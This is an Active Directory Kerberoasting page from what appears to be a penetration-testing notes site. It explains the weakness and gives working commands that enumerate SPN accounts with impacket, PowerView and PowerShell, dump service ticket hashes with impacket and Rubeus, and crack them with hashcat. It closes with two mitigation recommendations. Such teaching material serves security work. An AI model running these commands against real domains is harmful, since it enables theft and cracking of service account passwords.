---
layout: default
title: Kerberoasting
parent: Active Directory
nav_order: 7
permalink: /ad/kerberoasting/
---

# Kerberoasting
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

This attack focuses on domain service accounts that have a Service Principal Name (SPN) associated. With this attribute, it’s possible to legitimately request a Kerberos Ticket Granting Service (TGS) as an authenticated user on the domain.

Kerberos service tickets contain a key used by the protocol to encrypt the session. This key is encrypted with the service account’s password hash. Kerberoasting consist in cracking the hash of the service account.

## Prerequisites

- Low privileged domain account.
- Target must be a domain account with a Service Principal Name (SPN) associated.

## Exploit

First, identify a domain user with a SPN. You can list Kerberoastable users in multiple ways like below.

```bash
# From Kali.
sudo impacket-GetUserSPNs -dc-ip $dc_ip $domain/$username:$password

# From a domain joined computer with PowerView.
Get-NetUser -SPN

# From a domain joined computer with ActiveDirectory PowerShell module.
Get-ADUSer -Filter { ServicePrincipalName -ne "$null" } -Properties ServicePrincipalName
```

Following commands will request a TGS-REP for all Kerberoastable accounts. Hashes are then stored into the specified output file.

```bash
# From Kali.
sudo impacket-GetUserSPNs -request -dc-ip $dc_ip $domain/$username:$password

# From a domain joined computer.
.\Rubeus.exe kerberoast /outfile:kerberoast.out

# From a Windows computer not joined to the domain.
.\Rubeus.exe kerberoast /creduser:$domain\$username /credpassword:$password /domain:$domain /dc:$dc_ip /outfile:kerberost.out
```

Then, use `hashcat` to crack retrieved TGS-REP hashes.

```bash
sudo hashcat -m 13100 kerberoast.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Recommendations

- [ ]  Remove Service Principal Name (SPN) from domain users when it’s possible.
- [ ]  If removing SPN is not possible, enforce strong password for involved domain users so it makes it hard - even impossible - to crack them.